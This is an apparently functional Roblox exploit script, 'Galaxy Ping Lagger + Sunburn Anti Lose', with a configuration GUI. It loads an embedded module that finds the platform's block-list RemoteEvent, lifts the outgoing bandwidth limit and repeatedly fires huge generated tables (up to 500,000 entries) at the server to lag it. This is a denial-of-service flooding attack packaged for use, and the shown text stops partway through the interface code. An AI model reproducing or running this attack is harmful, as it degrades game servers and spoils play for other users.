-- ============================================================
-- Galaxy Ping Lagger + Sunburn Anti Lose (MERGED)
-- discord.gg/7Ar8QGZB2j
-- ============================================================

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui", 10)
if not plrGui then
    warn("[Galaxy] PlayerGui not found")
    return
end

-- Cleanup previous instance
if type(_G.__GalaxyCleanup) == "function" then
    pcall(_G.__GalaxyCleanup)
end

local CONFIG_FILE = "GalaxyPingLagger_Config.json"

-- ============================================================
-- CONFIG
-- ============================================================
local STRENGTHS = {
    { name = "Ultra Weak",  power = 5000 },
    { name = "Extra Weak",  power = 15000 },
    { name = "Weak",        power = 35000 },
    { name = "Normal",      power = 100000 },
    { name = "Strong",      power = 200000 },
    { name = "Extra Strong",power = 400000 },
    { name = "Ultra Strong",power = 750000 },
}

local PRESETS = {
    LOW  = { power = 35000,  interval = 0.18 },
    MED  = { power = 100000, interval = 0.125 },
    HIGH = { power = 400000, interval = 0.08 },
}

local DEFAULT_CFG = {
    -- Galaxy
    power        = 100000,
    interval     = 0.125,
    strength     = "Normal",
    keybindKb    = "F",
    keybindGp    = "ButtonR2",
    autoBrainrot = true,
    uiScale      = 1.0,
    locked       = false,
    posX         = nil,
    posY         = nil,
    -- Mode
    mode         = "Galaxy",
    -- Sunburn
    sbChildren        = 150000,
    sbFrameDelay      = 0.125,
    sbFireBurst       = 1,
    sbFieldSize       = 0,
    sbNestedPerChild  = 0,
    sbFieldsPerChild  = 0,
    sbRebuildEach     = false,
}

local cfg = {}
for k, v in pairs(DEFAULT_CFG) do cfg[k] = v end

local function saveConfig()
    if not writefile then return end
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded then pcall(writefile, CONFIG_FILE, encoded) end
end

local function loadConfig()
    pcall(function()
        if not (type(isfile) == "function" and type(readfile) == "function") then return end
        if not isfile(CONFIG_FILE) then return end
        local raw = readfile(CONFIG_FILE)
        local ok, data = pcall(function() return HttpService:JSONDecode(raw) end)
        if not ok or type(data) ~= "table" then return end

        cfg.power    = tonumber(data.power)    or DEFAULT_CFG.power
        cfg.interval = tonumber(data.interval) or DEFAULT_CFG.interval
        cfg.strength = type(data.strength) == "string" and data.strength or DEFAULT_CFG.strength
        cfg.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
        cfg.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
        if type(data.autoBrainrot) == "boolean" then cfg.autoBrainrot = data.autoBrainrot end
        local sc = tonumber(data.uiScale)
        if sc then cfg.uiScale = math.clamp(sc, 0.5, 1.8) end
        cfg.locked = data.locked == true
        cfg.posX   = tonumber(data.posX)
        cfg.posY   = tonumber(data.posY)

        if data.mode == "Sunburn" then cfg.mode = "Sunburn" end

        cfg.sbChildren       = tonumber(data.sbChildren)       or DEFAULT_CFG.sbChildren
        cfg.sbFrameDelay     = tonumber(data.sbFrameDelay)     or DEFAULT_CFG.sbFrameDelay
        cfg.sbFireBurst      = tonumber(data.sbFireBurst)      or DEFAULT_CFG.sbFireBurst
        cfg.sbFieldSize      = tonumber(data.sbFieldSize)      or DEFAULT_CFG.sbFieldSize
        cfg.sbNestedPerChild = tonumber(data.sbNestedPerChild) or DEFAULT_CFG.sbNestedPerChild
        cfg.sbFieldsPerChild = tonumber(data.sbFieldsPerChild) or DEFAULT_CFG.sbFieldsPerChild
        if type(data.sbRebuildEach) == "boolean" then cfg.sbRebuildEach = data.sbRebuildEach end
    end)
end
pcall(loadConfig)

-- ============================================================
-- COLORS + HELPERS
-- ============================================================
local C = {
    bg      = Color3.fromRGB(12, 8, 24),
    panel   = Color3.fromRGB(18, 12, 36),
    card    = Color3.fromRGB(28, 18, 48),
    input   = Color3.fromRGB(22, 14, 42),
    purple1 = Color3.fromRGB(100, 50, 180),
    purple2 = Color3.fromRGB(140, 80, 220),
    purple3 = Color3.fromRGB(180, 130, 255),
    accent  = Color3.fromRGB(120, 70, 220),
    white   = Color3.fromRGB(240, 235, 255),
    dim     = Color3.fromRGB(140, 120, 180),
    green   = Color3.fromRGB(90, 230, 140),
    red     = Color3.fromRGB(255, 100, 120),
    waiting = Color3.fromRGB(255, 190, 50),
    sun     = Color3.fromRGB(255, 200, 40),
    sunDark = Color3.fromRGB(200, 140, 20),
}

local function tw(obj, props, t, style)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function corner(p, r)
    local c = Instance.new("UICorner", p)
    c.CornerRadius = UDim.new(0, r or 10)
    return c
end

local function stroke(p, col, th, tr)
    local s = Instance.new("UIStroke", p)
    s.Color = col or C.purple1
    s.Thickness = th or 1.2
    s.Transparency = tr or 0.35
    return s
end

local function grad(p, c1, c2, rot)
    local g = Instance.new("UIGradient", p)
    g.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, c1), ColorSequenceKeypoint.new(1, c2)})
    g.Rotation = rot or 135
    return g
end

-- ✅ Fixed: no per-drag connection leak
local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, start, pos

    handle.InputBegan:Connect(function(i)
        if cfg.locked then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            start = i.Position
            pos = frame.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - start
            frame.Position = UDim2.new(pos.X.Scale, pos.X.Offset + d.X, pos.Y.Scale, pos.Y.Offset + d.Y)
        end
    end)

    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                cfg.posX = frame.Position.X.Offset
                cfg.posY = frame.Position.Y.Offset
                saveConfig()
            end
        end
    end)
end

local function bindTap(btn, fn)
    btn.Active = true
    btn.Selectable = true
    local last = 0
    local function fire()
        local now = os.clock()
        if now - last < 0.25 then return end
        last = now
        fn()
    end
    btn.MouseButton1Click:Connect(fire)
    btn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            fire()
        end
    end)
end

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick" or n:sub(1,4)=="DPad"
end

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent")) and c.Name:find("Block") then return c end
    end
    return nil
end

-- ============================================================
-- SUNBURN MODULE (safe load)
-- ============================================================
local SRC = [==[
local RunService = game:GetService("RunService")

local DEFAULTS = {
    Children       = 150000,
    NestedPerChild = 0,
    FieldsPerChild = 0,
    FireBurst      = 1,
    FrameDelay     = 0.125,
    FieldSize      = 0,
    RebuildEach    = false,
}

local LIMITS = {
    Children       = { min = 1,  max = 500000 },
    NestedPerChild = { min = 0,  max = 10 },
    FieldsPerChild = { min = 0,  max = 10 },
    FireBurst      = { min = 1,  max = 20 },
    FrameDelay     = { min = 0,  max = 5 },
    FieldSize      = { min = 0,  max = 4096 },
}

local config = {}
for k, v in pairs(DEFAULTS) do config[k] = v end

local state = { running = false, thread = nil, remote = nil, cache = nil }

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({ "SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList" }) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then return r end
    end
    return nil
end

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

local function build()
    local size     = math.clamp(config.FieldSize, LIMITS.FieldSize.min, LIMITS.FieldSize.max)
    local children = math.clamp(config.Children,  LIMITS.Children.min,  LIMITS.Children.max)
    local pad = size > 0 and string.rep("P", size) or ""
    local root = table.create(children)
    for i = 1, children do
        local entry = { id = i, v = i * 2 }
        for k = 1, config.FieldsPerChild do
            entry["k" .. k] = size > 0 and pad or (i + k)
        end
        for j = 1, config.NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if config.RebuildEach or not state.cache then
        payload = build()
        if not config.RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, config.FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return true end
    if not state.remote then state.remote = resolve() end
    if not state.remote then return false end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            local delay = config.FrameDelay
            if delay and delay > 0 then task.wait(delay) else RunService.Heartbeat:Wait() end
        end
    end)
    return true
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

return {
    start = start,
    stop = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
    setConfig = function(t)
        for k, v in pairs(t or {}) do
            if config[k] ~= nil then
                if type(config[k]) == "boolean" then
                    config[k] = v == true
                elseif type(config[k]) == "number" then
                    local n = tonumber(v)
                    if n then
                        local lim = LIMITS[k]
                        if lim then n = math.clamp(n, lim.min, lim.max) end
                        config[k] = n
                    end
                end
            end
        end
        state.cache = nil
    end,
    getConfig = function() return config end,
}
]==]

local api = nil
do
    local Loader = loadstring or load
    if type(Loader) == "function" then
        local ok, fn = pcall(Loader, SRC)
        if ok and type(fn) == "function" then
            local ok2, mod = pcall(fn)
            if ok2 and type(mod) == "table" then
                api = mod
            else
                warn("[Galaxy] Sunburn runtime error:", mod)
            end
        else
            warn("[Galaxy] Sunburn compile error:", fn)
        end
    else
        warn("[Galaxy] loadstring/load unavailable — Sunburn mode disabled")
    end
end

-- ============================================================
-- SCREEN GUI
-- ============================================================
local oldGui = plrGui:FindFirstChild("GalaxyPingLaggerGui")
if oldGui then oldGui:Destroy() end

local screen = Instance.new("ScreenGui")
screen.Name = "GalaxyPingLaggerGui"
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true
screen.DisplayOrder = 999
screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screen.Enabled = true

local okParent = pcall(function() screen.Parent = plrGui end)
if not okParent or not screen.Parent then
    pcall(function() screen.Parent = game:GetService("CoreGui") end)
end
if not screen.Parent then
    warn("[Galaxy] could not parent ScreenGui")
    return
end

local rootScale = Instance.new("UIScale")
rootScale.Name = "RootScale"
rootScale.Scale = math.clamp(tonumber(cfg.uiScale) or 1, 0.5, 1.8)
rootScale.Parent = screen

-- ============================================================
-- MAIN WINDOW
-- ============================================================
local MAIN_W, MAIN_H = 230, 124

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.fromOffset(MAIN_W, MAIN_H)
do
    local cam = workspace.CurrentCamera
    local vs = cam and cam.ViewportSize or Vector2.new(800, 600)
    local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    local useSaved = cfg.posX and cfg.posY and not isMobile
        and cfg.posX > -50 and cfg.posY > -50
        and cfg.posX < vs.X - 40 and cfg.posY < vs.Y - 40
    if useSaved then
        main.Position = UDim2.fromOffset(cfg.posX, cfg.posY)
    else
        main.Position = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
    end
end
main.Visible = true
main.BackgroundColor3 = C.bg
main.BorderSizePixel = 0
main.Active = false
main.Parent = screen
corner(main, 14)
stroke(main, C.purple1, 1.4, 0.3)
grad(main, C.bg, Color3.fromRGB(24, 12, 48), 150)

-- Header
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, 0, 0, 34)
header.BackgroundColor3 = C.panel
header.BorderSizePixel = 0
header.Active = true
header.ZIndex = 2
corner(header, 14)
grad(header, C.purple1, C.purple2, 120)

local headerFill = Instance.new("Frame", main)
headerFill.Size = UDim2.new(1, 0, 0, 10)
headerFill.Position = UDim2.fromOffset(0, 24)
headerFill.BackgroundColor3 = C.panel
headerFill.BorderSizePixel = 0
headerFill.ZIndex = 2
grad(headerFill, C.purple1, C.purple2, 120)

local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(1, -110, 1, 0)
title.Position = UDim2.fromOffset(10, 0)
title.BackgroundTransparency = 1
title.Text = "GALAXY PING LAGGER"
title.TextColor3 = C.white
title.Font = Enum.Font.GothamBlack
title.TextSize = 10
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 3

local lockBtn = Instance.new("TextButton", header)
lockBtn.Size = UDim2.fromOffset(22, 22)
lockBtn.Position = UDim2.new(1, -94, 0.5, -11)
lockBtn.BackgroundColor3 = Color3.fromRGB(40, 18, 70)
lockBtn.Text = cfg.locked and "🔒" or "🔓"
lockBtn.TextSize = 11
lockBtn.AutoButtonColor = false
lockBtn.ZIndex = 4
corner(lockBtn, 6)

local statusPill = Instance.new("Frame", header)
statusPill.Size = UDim2.fromOffset(44, 16)
statusPill.Position = UDim2.new(1, -68, 0.5, -8)
statusPill.BackgroundColor3 = Color3.fromRGB(50, 16, 40)
statusPill.BorderSizePixel = 0
statusPill.ZIndex = 3
corner(statusPill, 8)

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size = UDim2.fromScale(1, 1)
statusLbl.BackgroundTransparency = 1
statusLbl.Text = "OFF"
statusLbl.TextColor3 = C.red
statusLbl.Font = Enum.Font.GothamBlack
statusLbl.TextSize = 9
statusLbl.ZIndex = 4

local settingsBtn = Instance.new("TextButton", header)
settingsBtn.Size = UDim2.fromOffset(22, 22)
settingsBtn.Position = UDim2.new(1, -30, 0.5, -11)
settingsBtn.BackgroundColor3 = Color3.fromRGB(40, 18, 70)
settingsBtn.Text = "⚙"
settingsBtn.TextColor3 = C.white
settingsBtn.Font = Enum.Font.GothamBold
settingsBtn.TextSize = 12
settingsBtn.AutoButtonColor = false
settingsBtn.ZIndex = 4
corner(settingsBtn, 6)

makeDraggable(main, header)

-- Activate
local activateBtn = Instance.new("TextButton", main)
activateBtn.Size = UDim2.new(1, -16, 0, 28)
activateBtn.Position = UDim2.fromOffset(8, 40)
activateBtn.BackgroundColor3 = C.card
activateBtn.BorderSizePixel = 0
activateBtn.Text = ""
activateBtn.AutoButtonColor = false
activateBtn.Active = true
activateBtn.Selectable = true
activateBtn.ZIndex = 5
corner(activateBtn, 9)
local actGrad = grad(activateBtn, C.purple1, C.purple2, 135)
local actStroke = stroke(activateBtn, C.purple3, 1.1, 0.4)

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size = UDim2.fromScale(1, 1)
activateLbl.BackgroundTransparency = 1
activateLbl.Text = "ACTIVATE"
activateLbl.TextColor3 = C.white
activateLbl.Font = Enum.Font.GothamBlack
activateLbl.TextSize = 12
activateLbl.ZIndex = 4

-- ✅ NEW: Mode selector
local modeRow = Instance.new("Frame", main)
modeRow.Size = UDim2.new(1, -16, 0, 20)
modeRow.Position = UDim2.fromOffset(8, 72)
modeRow.BackgroundTransparency = 1
modeRow.ZIndex = 5

local modeGalaxy = Instance.new("TextButton", modeRow)
modeGalaxy.Size = UDim2.new(0.5, -2, 1, 0)
modeGalaxy.Position = UDim2.new(0, 0, 0, 0)
modeGalaxy.BackgroundColor3 = C.purple1
modeGalaxy.BorderSizePixel = 0
modeGalaxy.Text = "GALAXY"
modeGalaxy.TextColor3 = C.white
modeGalaxy.Font = Enum.Font.GothamBold
modeGalaxy.TextSize = 10
modeGalaxy.AutoButtonColor = false
modeGalaxy.ZIndex = 5
corner(modeGalaxy, 6)

local modeSunburn = Instance.new("TextButton", modeRow)
modeSunburn.Size = UDim2.new(0.5, -2, 1, 0)
modeSunburn.Position = UDim2.new(0.5, 2, 0, 0)
modeSunburn.BackgroundColor3 = C.card
modeSunburn.BorderSizePixel = 0
modeSunburn.Text = "SUNBURN"
modeSunburn.TextColor3 = C.dim
modeSunburn.Font = Enum.Font.GothamBold
modeSunburn.TextSize = 10
modeSunburn.AutoButtonColor = false
modeSunburn.ZIndex = 5
corner(modeSunburn, 6)

-- Presets
local presetRow = Instance.new("Frame", main)
presetRow.Size = UDim2.new(1, -16, 0, 24)
presetRow.Position = UDim2.fromOffset(8, 96)
presetRow.BackgroundTransparency = 1
presetRow.ZIndex = 5

local presetBtns = {}
local function makePreset(name, order)
    local b = Instance.new("TextButton", presetRow)
    b.Size = UDim2.new(1/3, -4, 1, 0)
    b.Position = UDim2.new((order-1)/3, 2, 0, 0)
    b.BackgroundColor3 = C.card
    b.BorderSizePixel = 0
    b.Text = name
    b.TextColor3 = C.dim
    b.Font = Enum.Font.GothamBold
    b.TextSize = 10
    b.AutoButtonColor = false
    b.ZIndex = 4
    corner(b, 7)
    stroke(b, C.purple1, 1, 0.55)
    presetBtns[name] = b
end
makePreset("LOW", 1)
makePreset("MED", 2)
makePreset("HIGH", 3)

-- ============================================================
-- SETTINGS WINDOW
-- ============================================================
local SET_W, SET_H = 240, 500

local settings = Instance.new("Frame")
settings.Name = "Settings"
settings.Size = UDim2.fromOffset(SET_W, SET_H)
settings.Position = UDim2.new(0.5, -SET_W/2, 0.5, -SET_H/2 + 40)
settings.BackgroundColor3 = C.panel
settings.BorderSizePixel = 0
settings.Visible = false
settings.ZIndex = 30
settings.ClipsDescendants = true
settings.Parent = screen
corner(settings, 14)
stroke(settings, C.purple2, 1.4, 0.25)
grad(settings, C.panel, Color3.fromRGB(14, 8, 30), 160)

local setHeader = Instance.new("Frame", settings)
setHeader.Size = UDim2.new(1, 0, 0, 34)
setHeader.BackgroundColor3 = C.purple1
setHeader.BorderSizePixel = 0
setHeader.ZIndex = 31
corner(setHeader, 14)
grad(setHeader, C.purple1, C.purple2, 120)

local setHeaderFill = Instance.new("Frame", settings)
setHeaderFill.Size = UDim2.new(1, 0, 0, 10)
setHeaderFill.Position = UDim2.fromOffset(0, 24)
setHeaderFill.BackgroundColor3 = C.purple1
setHeaderFill.BorderSizePixel = 0
setHeaderFill.ZIndex = 31
grad(setHeaderFill, C.purple1, C.purple2, 120)

local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size = UDim2.new(1, -40, 1, 0)
setTitle.Position = UDim2.fromOffset(12, 0)
setTitle.BackgroundTransparency = 1
setTitle.Text = "Settings"
setTitle.TextColor3 = C.white
setTitle.Font = Enum.Font.GothamBlack
setTitle.TextSize = 13
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.ZIndex = 32

local setClose = Instance.new("TextButton", setHeader)
setClose.Size = UDim2.fromOffset(24, 24)
setClose.Position = UDim2.new(1, -30, 0.5, -12)
setClose.BackgroundColor3 = Color3.fromRGB(40, 18, 70)
setClose.Text = "X"
setClose.TextColor3 = C.white
setClose.Font = Enum.Font.GothamBold
setClose.TextSize = 12
setClose.AutoButtonColor = false
setClose.ZIndex = 32
corner(setClose, 6)

makeDraggable(settings, setHeader)

local scroll = Instance.new("ScrollingFrame", settings)
scroll.Size = UDim2.new(1, -16, 1, -48)
scroll.Position = UDim2.fromOffset(8, 42)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 4
scroll.ScrollBarImageColor3 = C.purple3
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.ScrollingDirection = Enum.ScrollingDirection.Y
scroll.ZIndex = 31

local list = Instance.new("UIListLayout", scroll)
list.Padding = UDim.new(0, 7)
list.SortOrder = Enum.SortOrder.LayoutOrder

local pad = Instance.new("UIPadding", scroll)
pad.PaddingBottom = UDim.new(0, 10)
pad.PaddingTop = UDim.new(0, 2)

local function mkRow(height)
    local row = Instance.new("Frame", scroll)
    row.Size = UDim2.new(1, -4, 0, height or 36)
    row.BackgroundColor3 = C.card
    row.BorderSizePixel = 0
    row.ZIndex = 32
    corner(row, 9)
    stroke(row, C.purple1, 1, 0.55)
    return row
end

local function mkLabel(parent, text, x, w)
    local l = Instance.new("TextLabel", parent)
    l.Size = UDim2.new(w or 0.45, 0, 1, 0)
    l.Position = UDim2.fromOffset(x or 10, 0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = C.white
    l.Font = Enum.Font.GothamBold
    l.TextSize = 11
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.ZIndex = 33
    return l
end

local function mkTextBox(parent, default)
    local box = Instance.new("TextBox", parent)
    box.Size = UDim2.fromOffset(90, 24)
    box.Position = UDim2.new(1, -100, 0.5, -12)
    box.BackgroundColor3 = C.input
    box.BorderSizePixel = 0
    box.Text = tostring(default)
    box.TextColor3 = C.purple3
    box.Font = Enum.Font.GothamBold
    box.TextSize = 12
    box.ClearTextOnFocus = false
    box.ZIndex = 33
    corner(box, 7)
    stroke(box, C.purple2, 1, 0.45)
    return box
end

-- Existing rows
local powerRow = mkRow(36)
powerRow.LayoutOrder = 1
mkLabel(powerRow, "Power")
local powerBox = mkTextBox(powerRow, cfg.power)

local delayRow = mkRow(36)
delayRow.LayoutOrder = 2
mkLabel(delayRow, "Delay (secs)")
local delayBox = mkTextBox(delayRow, cfg.interval)

local strengthRow = mkRow(36)
strengthRow.LayoutOrder = 3
mkLabel(strengthRow, "Strength")
local strengthBtn = Instance.new("TextButton", strengthRow)
strengthBtn.Size = UDim2.fromOffset(100, 24)
strengthBtn.Position = UDim2.new(1, -110, 0.5, -12)
strengthBtn.BackgroundColor3 = C.input
strengthBtn.BorderSizePixel = 0
strengthBtn.Text = cfg.strength
strengthBtn.TextColor3 = C.purple3
strengthBtn.Font = Enum.Font.GothamBold
strengthBtn.TextSize = 11
strengthBtn.AutoButtonColor = false
strengthBtn.ZIndex = 33
corner(strengthBtn, 7)
stroke(strengthBtn, C.purple2, 1, 0.45)

local brRow = mkRow(36)
brRow.LayoutOrder = 4
mkLabel(brRow, "Auto Brainrot", 10, 0.65)
local brBtn = Instance.new("TextButton", brRow)
brBtn.Size = UDim2.fromOffset(52, 24)
brBtn.Position = UDim2.new(1, -62, 0.5, -12)
brBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(70, 25, 40)
brBtn.BorderSizePixel = 0
brBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
brBtn.TextColor3 = C.white
brBtn.Font = Enum.Font.GothamBlack
brBtn.TextSize = 11
brBtn.AutoButtonColor = false
brBtn.ZIndex = 33
corner(brBtn, 12)

local scaleRow = mkRow(36)
scaleRow.LayoutOrder = 5
mkLabel(scaleRow, "UI Scale", 10, 0.4)
local scaleMinus = Instance.new("TextButton", scaleRow)
scaleMinus.Size = UDim2.fromOffset(28, 24)
scaleMinus.Position = UDim2.new(1, -120, 0.5, -12)
scaleMinus.BackgroundColor3 = C.input
scaleMinus.Text = "−"
scaleMinus.TextColor3 = C.white
scaleMinus.Font = Enum.Font.GothamBold
scaleMinus.TextSize = 16
scaleMinus.AutoButtonColor = false
scaleMinus.ZIndex = 33
corner(scaleMinus, 7)

local scaleLbl = Instance.new("TextLabel", scaleRow)
scaleLbl.Size = UDim2.fromOffset(48, 24)
scaleLbl.Position = UDim2.new(1, -88, 0.5, -12)
scaleLbl.BackgroundColor3 = C.input
scaleLbl.Text = string.format("%.1f", cfg.uiScale)
scaleLbl.TextColor3 = C.purple3
scaleLbl.Font = Enum.Font.GothamBold
scaleLbl.TextSize = 12
scaleLbl.ZIndex = 33
corner(scaleLbl, 7)

local scalePlus = Instance.new("TextButton", scaleRow)
scalePlus.Size = UDim2.fromOffset(28, 24)
scalePlus.Position = UDim2.new(1, -36, 0.5, -12)
scalePlus.BackgroundColor3 = C.input
scalePlus.Text = "+"
scalePlus.TextColor3 = C.white
scalePlus.Font = Enum.Font.GothamBold
scalePlus.TextSize = 16
scalePlus.AutoButtonColor = false
scalePlus.ZIndex = 33
corner(scalePlus, 7)

-- Keybinds header
local kbHeader = Instance.new("TextLabel", scroll)
kbHeader.Size = UDim2.new(1, -4, 0, 18)
kbHeader.BackgroundTransparency = 1
kbHeader.Text = "KEYBINDS  (click to reassign, X to remove)"
kbHeader.TextColor3 = C.dim
kbHeader.Font = Enum.Font.GothamBold
kbHeader.TextSize = 9
kbHeader.TextXAlignment = Enum.TextXAlignment.Left
kbHeader.LayoutOrder = 6
kbHeader.ZIndex = 32

local kbRow = mkRow(36)
kbRow.LayoutOrder = 7
mkLabel(kbRow, "Keyboard", 10, 0.4)
local kbBind = Instance.new("TextButton", kbRow)
kbBind.Size = UDim2.fromOffset(70, 24)
kbBind.Position = UDim2.new(1, -108, 0.5, -12)
kbBind.BackgroundColor3 = C.input
kbBind.Text = cfg.keybindKb
kbBind.TextColor3 = C.purple3
kbBind.Font = Enum.Font.GothamBold
kbBind.TextSize = 11
kbBind.AutoButtonColor = false
kbBind.ZIndex = 33
corner(kbBind, 7)
stroke(kbBind, C.purple2, 1, 0.5)

local kbClear = Instance.new("TextButton", kbRow)
kbClear.Size = UDim2.fromOffset(24, 24)
kbClear.Position = UDim2.new(1, -32, 0.5, -12)
kbClear.BackgroundColor3 = Color3.fromRGB(60, 20, 35)
kbClear.Text = "X"
kbClear.TextColor3 = C.red
kbClear.Font = Enum.Font.GothamBlack
kbClear.TextSize = 11
kbClear.AutoButtonColor = false
kbClear.ZIndex = 33
corner(kbClear, 7)

local gpRow = mkRow(36)
gpRow.LayoutOrder = 8
mkLabel(gpRow, "Controller", 10, 0.4)
local gpBind = Instance.new("TextButton", gpRow)
gpBind.Size = UDim2.fromOffset(80, 24)
gpBind.Position = UDim2.new(1, -118, 0.5, -12)
gpBind.BackgroundColor3 = C.input
gpBind.Text = cfg.keybindGp
gpBind.TextColor3 = C.purple3
gpBind.Font = Enum.Font.GothamBold
gpBind.TextSize = 10
gpBind.AutoButtonColor = false
gpBind.ZIndex = 33
corner(gpBind, 7)
stroke(gpBind, C.purple2, 1, 0.5)

local gpClear = Instance.new("TextButton", gpRow)
gpClear.Size = UDim2.fromOffset(24, 24)
gpClear.Position = UDim2.new(1, -32, 0.5, -12)
gpClear.BackgroundColor3 = Color3.fromRGB(60, 20, 35)
gpClear.Text = "X"
gpClear.TextColor3 = C.red
gpClear.Font = Enum.Font.GothamBlack
gpClear.TextSize = 11
gpClear.AutoButtonColor = false
gpClear.ZIndex = 33
corner(gpClear, 7)

-- ✅ NEW: Sunburn params header
local sbHeader = Instance.new("TextLabel", scroll)
sbHeader.Size = UDim2.new(1, -4, 0, 18)
sbHeader.BackgroundTransparency = 1
sbHeader.Text = "SUNBURN PARAMS  (used when mode = SUNBURN)"
sbHeader.TextColor3 = C.sun
sbHeader.Font = Enum.Font.GothamBold
sbHeader.TextSize = 9
sbHeader.TextXAlignment = Enum.TextXAlignment.Left
sbHeader.LayoutOrder = 9
sbHeader.ZIndex = 32

local function mkSbRow(order, label, def, key, validator)
    local row = mkRow(36)
    row.LayoutOrder = order
    mkLabel(row, label, 10, 0.55)
    local box = mkTextBox(row, def)
    box.FocusLost:Connect(function()
        local n = validator(tonumber(box.Text))
        if n then
            cfg[key] = n
            box.Text = tostring(n)
            saveConfig()
        else
            box.Text = tostring(cfg[key])
        end
    end)
    return box
end

local sbChildrenBox = mkSbRow(10, "Children",  cfg.sbChildren, "sbChildren",
    function(n) if not n then return nil end; return math.clamp(math.floor(n), 1, 500000) end)

local sbFrameDelayBox = mkSbRow(11, "Frame Delay", cfg.sbFrameDelay, "sbFrameDelay",
    function(n) if not n then return nil end; return math.clamp(n, 0, 5) end)

local sbFireBurstBox = mkSbRow(12, "Fire Burst", cfg.sbFireBurst, "sbFireBurst",
    function(n) if not n then return nil end; return math.clamp(math.floor(n), 1, 20) end)

local sbFieldSizeBox = mkSbRow(13, "Field Size", cfg.sbFieldSize, "sbFieldSize",
    function(n) if not n then return nil end; return math.clamp(math.floor(n), 0, 4096) end)

local sbNestedBox = mkSbRow(14, "Nested Per Child", cfg.sbNestedPerChild, "sbNestedPerChild",
    function(n) if not n then return nil end; return math.clamp(math.floor(n), 0, 10) end)

local sbFieldsBox = mkSbRow(15, "Fields Per Child", cfg.sbFieldsPerChild, "sbFieldsPerChild",
    function(n) if not n then return nil end; return math.clamp(math.floor(n), 0, 10) end)

local sbRebuildRow = mkRow(36)
sbRebuildRow.LayoutOrder = 16
mkLabel(sbRebuildRow, "Rebuild Each Fire", 10, 0.65)
local sbRebuildBtn = Instance.new("TextButton", sbRebuildRow)
sbRebuildBtn.Size = UDim2.fromOffset(52, 24)
sbRebuildBtn.Position = UDim2.new(1, -62, 0.5, -12)
sbRebuildBtn.BackgroundColor3 = cfg.sbRebuildEach and C.green or Color3.fromRGB(70, 25, 40)
sbRebuildBtn.BorderSizePixel = 0
sbRebuildBtn.Text = cfg.sbRebuildEach and "ON" or "OFF"
sbRebuildBtn.TextColor3 = C.white
sbRebuildBtn.Font = Enum.Font.GothamBlack
sbRebuildBtn.TextSize = 11
sbRebuildBtn.AutoButtonColor = false
sbRebuildBtn.ZIndex = 33
corner(sbRebuildBtn, 12)

